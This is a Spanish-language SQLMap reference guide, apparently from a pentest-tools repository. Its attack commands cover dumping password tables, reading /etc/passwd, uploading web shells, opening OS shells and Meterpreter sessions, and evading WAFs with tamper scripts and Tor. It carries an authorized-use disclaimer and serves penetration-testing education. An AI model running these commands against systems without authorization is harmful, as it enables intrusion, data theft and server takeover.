# 💉 SQLMap - Guía de referencia completa

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   _____ ____    __    __  __           
  / ___// __ \  / /   /  |/  /___ _____ 
  \__ \/ / / / / /   / /|_/ / __ `/ __ \
 ___/ / /_/ / / /___/ /  / / /_/ / /_/ /
/____/\___\_\/_____/_/  /_/\__,_/ .___/ 
                               /_/      
    Herramienta de inyección SQL automática
```

<p align="center">
  <img src="https://img.shields.io/badge/SQLMap-Injection-red?style=for-the-badge" alt="SQLMap">
  <img src="https://img.shields.io/badge/SQL-Injection-orange?style=for-the-badge" alt="Inyección SQL">
  <img src="https://img.shields.io/badge/Python-Tool-blue?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Penetration-Testing-purple?style=for-the-badge" alt="Pruebas de penetración">
</p>

<p align="center">
  <b>🔥 La herramienta más potente para automatizar inyecciones SQL</b>
</p>

---

## 📋 Índice

- [Introducción](#-introducción)
- [Instalación](#-instalación)
- [Sintaxis básica](#-sintaxis-básica)
- [Opciones de objetivos](#-opciones-de-objetivos)
- [Opciones de solicitudes](#-opciones-de-solicitudes)
- [Opciones de detección](#-opciones-de-detección)
- [Enumeración](#-enumeración)
- [Extracción de datos](#-extracción-de-datos)
- [Operaciones con archivos](#-operaciones-con-archivos)
- [Acceso al sistema operativo](#-acceso-al-sistema-operativo)
- [Técnicas de evasión](#-técnicas-de-evasión)
- [Scripts tamper](#referencia-de-scripts-tamper)
- [Ejemplos prácticos](#-ejemplos-prácticos)
- [Referencia rápida](#-referencia-rápida)
- [Consejos y buenas prácticas](#-consejos-y-buenas-prácticas)
- [Recursos](#-recursos)

---

## 🎯 Introducción

Los scripts tamper transforman la representación de los payloads; no garantizan eludir un WAF (cortafuegos de aplicaciones web) o un IPS (sistema de prevención de intrusiones). El acceso al sistema operativo y las operaciones con archivos dependen del gestor de base de datos y de sus permisos.

**SQLMap** es una herramienta de pruebas de penetración de código abierto que automatiza la detección y explotación de vulnerabilidades de inyección SQL.

### Funciones principales

| Función | Descripción |
|---------|-------------|
| **Detección automática** | Detecta automáticamente vulnerabilidades de inyección SQL |
| **Bases de datos compatibles** | MySQL, PostgreSQL, MSSQL, Oracle, SQLite y otras |
| **Control completo** | Identificación de bases de datos, extracción de datos y acceso al sistema operativo |
| **Técnicas de evasión** | Evasión de WAF/IPS mediante scripts tamper |
| **Varios tipos de inyección** | Booleana, basada en errores, UNION, consultas apiladas y basada en tiempo |

### Bases de datos compatibles

```
✅ MySQL          ✅ PostgreSQL      ✅ Microsoft SQL Server
✅ Oracle         ✅ SQLite          ✅ IBM DB2
✅ SAP MaxDB      ✅ Firebird        ✅ Sybase
✅ HSQLDB         ✅ Informix        ✅ H2
```

### Tipos de inyección SQL

| Type | Código | Descripción |
|------|------|-------------|
| Ciega basada en condiciones booleanas | `B` | Respuestas verdadero/falso |
| Basada en errores | `E` | Errores de la base de datos en la respuesta |
| Basada en consultas UNION | `U` | Inyección mediante UNION SELECT |
| Consultas apiladas | `S` | Varias consultas (;) |
| Ciega basada en tiempo | `T` | Retardos en el tiempo de respuesta |
| Consultas en línea | `Q` | Consultas en línea (anidadas) |

---

## 📥 Instalación

### Kali Linux (preinstalado)
```bash
# Actualizar SQLMap
sudo apt update && sudo apt install sqlmap
```

### Desde GitHub (última versión)
```bash
# Clonar el repositorio
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Ejecutar SQLMap
cd sqlmap-dev
python sqlmap.py --version
```

### Mediante pip
```bash
pip install sqlmap
```

### Docker
```bash
docker pull paoloo/sqlmap
docker run -it paoloo/sqlmap -u "http://target.com/page?id=1"
```

### Verificar la instalación
```bash
sqlmap --version
sqlmap -h          # Ayuda básica
sqlmap -hh         # Ayuda avanzada
```

---

<a id="-sintaxis-básica"></a>
## ⌨️ Sintaxis básica

### Sintaxis general
```bash
sqlmap [options] -u "URL" 
sqlmap [options] -r request.txt
```

### Ejemplos para empezar
```bash
# Escaneo básico
sqlmap -u "http://target.com/page.php?id=1"

# Escanear con una cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Escanear una solicitud POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Escanear a partir de un archivo
sqlmap -r request.txt

# Modo totalmente automático
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

## 🎯 Opciones de objetivos

### Objetivo URL (-u)
```bash
# URL básica
sqlmap -u "http://target.com/page.php?id=1"

# Varios parámetros
sqlmap -u "http://target.com/page.php?id=1&cat=5"

# Especificar el parámetro que se va a probar
sqlmap -u "http://target.com/page.php?id=1&cat=5" -p id

# Probar todos los parámetros
sqlmap -u "http://target.com/page.php?id=1&cat=5" --level=5
```

### Archivo de solicitud (-r)
```bash
# Guardar la solicitud de Burp Suite en un archivo
# Después, escanear:
sqlmap -r request.txt

# Ejemplo de archivo de solicitud:
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# Cookie: session=abc123
#
# username=admin&password=test
```

### Dork de Google (-g)
```bash
# Buscar y probar resultados de Google
sqlmap -g "inurl:page.php?id="

# Con páginas concretas
sqlmap -g "inurl:product.php?id= site:target.com"
```

### Conexión directa a la base de datos (-d)
```bash
# Conectarse directamente a la base de datos
sqlmap -d "mysql://user:pass@target.com:3306/database"
sqlmap -d "mssql://user:pass@target.com:1433/database"
```

### Objetivos en lote (-m)
```bash
# Archivo con varias URL
sqlmap -m targets.txt

# targets.txt:
# http://target1.com/page.php?id=1
# http://target2.com/item.php?id=2
# http://target3.com/view.php?id=3
```

### Archivo de configuración (-c)
```bash
# Usar un archivo de configuración
sqlmap -c sqlmap.conf
```

---

## 📡 Opciones de solicitudes

### Método HTTP y datos
```bash
# Datos POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Especificar el método
sqlmap -u "http://target.com/api/user/1" --method=PUT

# Datos JSON
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

### Cookies
```bash
# Una cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Varias cookies
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc;auth=xyz"

# Cargar cookies desde un archivo
sqlmap -u "http://target.com/page.php?id=1" --load-cookies=cookies.txt

# Probar un parámetro de cookie
sqlmap -u "http://target.com/page.php" --cookie="id=1*" --level=2
```

### Cabeceras
```bash
# Cabecera personalizada
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"

# Varias cabeceras
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1\nAccept-Language: en"

# User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# User-Agent aleatorio
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Referer
sqlmap -u "http://target.com/page.php?id=1" --referer="http://google.com"
```

### Autenticación
```bash
# Autenticación Basic
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"

# Autenticación Digest
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Digest --auth-cred="user:pass"

# Autenticación NTLM
sqlmap -u "http://target.com/page.php?id=1" --auth-type=NTLM --auth-cred="domain\\user:pass"
```

### Proxy
```bash
# Proxy HTTP
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Proxy SOCKS
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"

# Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5

# Comprobar Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor
```

---

## 🔍 Opciones de detección

### Nivel y riesgo

> **Interpretación:** `--level` amplía las pruebas y ubicaciones evaluadas; no es una garantía de probar cualquier parámetro. `--batch` acepta respuestas predeterminadas, pero no habilita automáticamente todas las técnicas ni hace inocuas las pruebas.
```bash
# Nivel (1-5): cantidad de pruebas
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Riesgo (1-3): peligrosidad de las pruebas
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# Recomendado para pruebas exhaustivas
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

| Nivel | Pruebas |
|-------|-------|
| 1 | Predeterminado: pruebas básicas |
| 2 | + Pruebas de cookies |
| 3 | + Pruebas de User-Agent y Referer |
| 4 | + Más payloads |
| 5 | + Todos los payloads |

| Riesgo | Descripción |
|------|-------------|
| 1 | Predeterminado: pruebas seguras |
| 2 | + Pruebas intensivas basadas en tiempo |
| 3 | + Pruebas basadas en OR (¡pueden modificar datos!) |

### Selección de técnicas
```bash
# Una técnica concreta
sqlmap -u "http://target.com/page.php?id=1" --technique=U    # Solo UNION
sqlmap -u "http://target.com/page.php?id=1" --technique=B    # Solo booleana
sqlmap -u "http://target.com/page.php?id=1" --technique=E    # Solo basada en errores
sqlmap -u "http://target.com/page.php?id=1" --technique=T    # Solo basada en tiempo
sqlmap -u "http://target.com/page.php?id=1" --technique=S    # Solo consultas apiladas

# Varias técnicas
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# Todas las técnicas (predeterminado)
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
```

### Retardos
```bash
# Tiempo para inyección basada en tiempo (predeterminado: 5)
sqlmap -u "http://target.com/page.php?id=1" --time-sec=10

# Retardo entre solicitudes
sqlmap -u "http://target.com/page.php?id=1" --delay=2
```

### Hilos
```bash
# Conexiones simultáneas (predeterminado: 1)
sqlmap -u "http://target.com/page.php?id=1" --threads=10
```

---

## 📊 Enumeración

### Enumeración de bases de datos
```bash
# Obtener la base de datos actual
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Obtener el usuario actual
sqlmap -u "http://target.com/page.php?id=1" --current-user

# Comprobar si el usuario es administrador de la base de datos (DBA)
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# Listar todas las bases de datos
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Listar todos los usuarios
sqlmap -u "http://target.com/page.php?id=1" --users

# Listar contraseñas de usuarios
sqlmap -u "http://target.com/page.php?id=1" --passwords

# Listar privilegios
sqlmap -u "http://target.com/page.php?id=1" --privileges

# Listar roles
sqlmap -u "http://target.com/page.php?id=1" --roles
```

### Enumeración de tablas
```bash
# Listar las tablas de una base de datos
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Listar todas las tablas
sqlmap -u "http://target.com/page.php?id=1" --tables

# Contar los registros de las tablas
sqlmap -u "http://target.com/page.php?id=1" -D database_name --count
```

### Enumeración de columnas
```bash
# Listar las columnas de una tabla
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Buscar nombres de columnas
sqlmap -u "http://target.com/page.php?id=1" --search -C password
sqlmap -u "http://target.com/page.php?id=1" --search -C email,user
```

### Volcado del esquema
```bash
# Volcar el esquema de la base de datos
sqlmap -u "http://target.com/page.php?id=1" --schema

# Excluir las bases de datos del sistema
sqlmap -u "http://target.com/page.php?id=1" --schema --exclude-sysdbs
```

---

## 📤 Extracción de datos

### Volcar datos
```bash
# Volcar una tabla concreta
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# Volcar columnas concretas
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump

# Volcar todas las tablas de una base de datos
sqlmap -u "http://target.com/page.php?id=1" -D database --dump-all

# Volcar todo
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Excluir las bases de datos del sistema
sqlmap -u "http://target.com/page.php?id=1" --dump-all --exclude-sysdbs
```

### Limitar los resultados
```bash
# Primeras 10 filas
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=1 --stop=10

# Filas 5-15
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=5 --stop=15

# Cláusula WHERE
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --where="admin=1"
```

### Consultas SQL personalizadas
```bash
# Ejecutar una consulta SQL
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT version()"

# Shell SQL interactiva
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

### Formatos de salida

> **Corrección del ejemplo:** `--output-dir` cambia el directorio de salida, no selecciona HTML. El formato de volcado se controla mediante `--dump-format` (CSV, HTML o SQLITE). Se conserva el comando original. Véase la [guía oficial de uso](https://github.com/sqlmapproject/sqlmap/wiki/Usage).
```bash
# Guardar en CSV
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --csv-del=","

# Guardar en HTML
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --output-dir=/tmp/output
```

---

## 📁 Operaciones con archivos

### Leer archivos
```bash
# Leer un archivo del servidor
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Leer archivos de Windows
sqlmap -u "http://target.com/page.php?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"

# Leer la configuración web
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"
```

### Escribir archivos
```bash
# Escribir un archivo en el servidor
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"

# Subir una web shell
sqlmap -u "http://target.com/page.php?id=1" --file-write="./webshell.php" --file-dest="/var/www/html/cmd.php"
```

---

## 💻 Acceso al sistema operativo

### Ejecución de comandos
```bash
# Ejecutar un comando del sistema operativo
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Shell interactiva
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# PowerShell en Windows
sqlmap -u "http://target.com/page.php?id=1" --os-shell --os-cmd="powershell"
```

### Sesión de Meterpreter
```bash
# Obtener una sesión de Meterpreter
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# Con opciones concretas
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --msf-path=/opt/metasploit
```

### SMB Relay
```bash
# Ataque de retransmisión SMB (SMB relay)
sqlmap -u "http://target.com/page.php?id=1" --os-smbrelay
```

### Acceso al Registro (Windows)

> **Errata del original:** en el ejemplo de lectura aparece `-reg-key` con un solo guion; la opción documentada es `--reg-key`. Se conserva la línea original para mantener la correspondencia.
```bash
# Leer el Registro
sqlmap -u "http://target.com/page.php?id=1" --reg-read -reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft"

# Añadir una clave del Registro
sqlmap -u "http://target.com/page.php?id=1" --reg-add --reg-key="..." --reg-value="..." --reg-data="..." --reg-type=REG_SZ

# Eliminar una clave del Registro
sqlmap -u "http://target.com/page.php?id=1" --reg-del --reg-key="..." --reg-value="..."
```

---

<a id="-técnicas-de-evasión"></a>
## 🛡️ Técnicas de evasión

### Evasión de WAF/IPS

> **Versiones:** `--identify-waf` es una opción histórica y puede no estar disponible. Contrasta las opciones con la ayuda de la versión instalada y con el [analizador oficial de argumentos](https://github.com/sqlmapproject/sqlmap/blob/master/lib/parse/cmdline.py).
```bash
# Identificar el WAF
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# Omitir la detección de WAF
sqlmap -u "http://target.com/page.php?id=1" --skip-waf

# Mayúsculas y minúsculas aleatorias
sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase

# Varios scripts tamper
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between
```

### Scripts tamper habituales
```bash
# Codificación URL
--tamper=charencode

# Codificación URL doble
--tamper=chardoubleencode

# Codificación Unicode
--tamper=charunicodeencode

# Sustituir espacios por comentarios
--tamper=space2comment
--tamper=space2hash
--tamper=space2morehash

# Manipulación de mayúsculas y minúsculas
--tamper=randomcase
--tamper=lowercase
--tamper=uppercase

# Sustituir palabras clave
--tamper=between
--tamper=equaltolike
```

### Referencia de scripts tamper

| Script | Descripción |
|--------|-------------|
| `apostrophemask` | Sustituir el apóstrofo por UTF-8 |
| `apostrophenullencode` | Sustituir el apóstrofo por Unicode doble |
| `base64encode` | Codificar el payload en Base64 |
| `between` | Sustituir `>` por `NOT BETWEEN 0 AND #` |
| `charencode` | Codificar todos los caracteres como URL |
| `charunicodeencode` | Codificar como Unicode-URL |
| `concat2concatws` | Sustituir `CONCAT` por `CONCAT_WS` |
| `equaltolike` | Sustituir `=` por `LIKE` |
| `greatest` | Sustituir `>` por `GREATEST` |
| `halfversionedmorekeywords` | Añadir un comentario con versión de MySQL |
| `ifnull2ifisnull` | Sustituir `IFNULL` por `IF(ISNULL())` |
| `lowercase` | Sustituir palabras clave por minúsculas |
| `modsecurityversioned` | Eludir ModSecurity mediante un comentario con versión |
| `modsecurityzeroversioned` | Eludir ModSecurity mediante un comentario con versión cero |
| `percentage` | Añadir el signo de porcentaje delante de los caracteres |
| `randomcase` | Mayúsculas y minúsculas aleatorias en palabras clave |
| `randomcomments` | Añadir comentarios aleatorios a las palabras clave SQL |
| `securesphere` | Añadir una cadena especial para eludir SecureSphere |
| `space2comment` | Sustituir el espacio por `/**/` |
| `space2dash` | Sustituir el espacio por comentario de guiones `--` |
| `space2hash` | Sustituir el espacio por un comentario `#` |
| `space2morehash` | Sustituir el espacio por `#` y un salto de línea |
| `space2mssqlblank` | Sustituir el espacio por caracteres en blanco de MSSQL |
| `space2mssqlhash` | Sustituir el espacio por `#` y un salto de línea (MSSQL) |
| `space2plus` | Sustituir el espacio por `+` |
| `space2randomblank` | Sustituir el espacio por un carácter en blanco aleatorio |
| `symboliclogical` | Sustituir `AND`/`OR` por `&&`/`||` |
| `unionalltounion` | Sustituir `UNION ALL` por `UNION` |
| `unmagicquotes` | Sustituir la comilla por una secuencia multibyte `%bf%27` |
| `uppercase` | Sustituir palabras clave por mayúsculas |
| `versionedkeywords` | Encerrar palabras clave en un comentario con versión |
| `versionedmorekeywords` | Encerrar más palabras clave en un comentario con versión |
| `xforwardedfor` | Añadir una cabecera falsa `X-Forwarded-For` |

---

## 🎬 Ejemplos prácticos

### Ejemplo 1: Escaneo básico
```bash
# Escanear en modo automático
sqlmap -u "http://target.com/products.php?id=1" --batch --banner
```

### Ejemplo 2: Volcado completo de la base de datos
```bash
# Enumerar y volcar
sqlmap -u "http://target.com/page.php?id=1" \
    --dbs \
    --batch

# Después de encontrar la base de datos
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    --tables \
    --batch

# Volcar la tabla users
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    -T users \
    --dump \
    --batch
```

### Ejemplo 3: Solicitud POST con cookie
```bash
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    --cookie="PHPSESSID=abc123" \
    --level=3 \
    --risk=2 \
    --batch
```

### Ejemplo 4: Mediante el proxy de Burp
```bash
# Guardar la solicitud de Burp en un archivo y después:
sqlmap -r request.txt \
    --proxy="http://127.0.0.1:8080" \
    --batch
```

### Ejemplo 5: Evasión de WAF
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper=space2comment,randomcase,between \
    --random-agent \
    --level=3 \
    --risk=2 \
    --batch
```

### Ejemplo 6: Obtener una shell del sistema operativo
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --os-shell \
    --batch
```

### Ejemplo 7: Leer archivos sensibles
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --file-read="/etc/passwd" \
    --batch
```

---

## 📊 Referencia rápida

### Comandos esenciales

| Comando | Descripción |
|---------|-------------|
| `-u URL` | URL objetivo con parámetro |
| `-r FILE` | Cargar una solicitud desde un archivo |
| `--data=DATA` | Datos POST |
| `--cookie=COOKIE` | Cookie HTTP |
| `--dbs` | Listar bases de datos |
| `--tables` | Listar tablas |
| `--columns` | Listar columnas |
| `--dump` | Volcar datos |
| `-D DB` | Especificar la base de datos |
| `-T TABLE` | Especificar la tabla |
| `-C COLS` | Especificar las columnas |
| `--batch` | Modo no interactivo |

### Opciones de detección

| Opción | Descripción |
|--------|-------------|
| `--level=LEVEL` | Nivel de pruebas (1-5) |
| `--risk=RISK` | Nivel de riesgo (1-3) |
| `-p PARAM` | Parámetro que se va a probar |
| `--technique=TECH` | Técnica de inyección |
| `--threads=N` | Hilos simultáneos |

### Opciones de salida

| Opción | Descripción |
|--------|-------------|
| `-v LEVEL` | Nivel de detalle (0-6) |
| `--batch` | No solicitar entradas al usuario |
| `--flush-session` | Vaciar la caché de sesión |
| `--output-dir=DIR` | Directorio de salida personalizado |

---

## 💡 Consejos y buenas prácticas

### Consejos de rendimiento

1. **Empezar por lo sencillo**
   ```bash
   # Empezar con un nivel bajo
   sqlmap -u "URL" --level=1 --batch
   # Aumentar si es necesario
   ```

2. **Usar --batch para automatizar**
   ```bash
   sqlmap -u "URL" --batch --dbs
   ```

3. **Ahorrar tiempo mediante pruebas concretas**
   ```bash
   # Probar solo inyecciones basadas en UNION
   sqlmap -u "URL" --technique=U
   ```

### Consejos de discreción

1. **User-Agent aleatorio**
   ```bash
   sqlmap -u "URL" --random-agent
   ```

2. **Añadir un retardo**
   ```bash
   sqlmap -u "URL" --delay=2
   ```

3. **Usar Tor**
   ```bash
   sqlmap -u "URL" --tor --check-tor
   ```

### Resolución de problemas

| Problema | Solución |
|-------|----------|
| No se encontró ninguna inyección | Aumentar `--level` y `--risk` |
| Bloqueo del WAF | Usar `--tamper` scripts |
| Escaneo lento | Reducir `--level`, usar una técnica concreta mediante `--technique` |
| Problemas de conexión | Comprobar `--timeout`, `--retries` |

---

## ⚠️ Aviso legal

> **ADVERTENCIA:** SQLMap es una herramienta potente que debe usarse únicamente para **pruebas autorizadas**.
> 
> - ✅ Realizar pruebas en sistemas propios
> - ✅ Realizar pruebas con permiso explícito por escrito
> - ✅ Usar en pruebas de penetración legales
> - ❌ Nunca usar en sistemas sin autorización
> - ❌ Nunca usar con fines maliciosos
> 
> **El acceso no autorizado a sistemas informáticos es ilegal y está penado por la ley.**

---

## 📚 Recursos

### Recursos oficiales
- [Sitio web oficial de SQLMap](https://sqlmap.org/)
- [GitHub de SQLMap](https://github.com/sqlmapproject/sqlmap)
- [Wiki de SQLMap](https://github.com/sqlmapproject/sqlmap/wiki)

### Recursos de aprendizaje
- [Inyección SQL de OWASP](https://owasp.org/www-community/attacks/SQL_Injection)
- [Inyección SQL de PortSwigger](https://portswigger.net/web-security/sql-injection)

### Guías de referencia relacionadas
- [Metasploit Framework](../../Metasploit/translations/README.es.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.es.md)

---

<p align="center">
  <b>💉 ¡Domina las pruebas de inyección SQL!</b><br>
  <i>Un gran poder conlleva una gran responsabilidad</i>
</p>
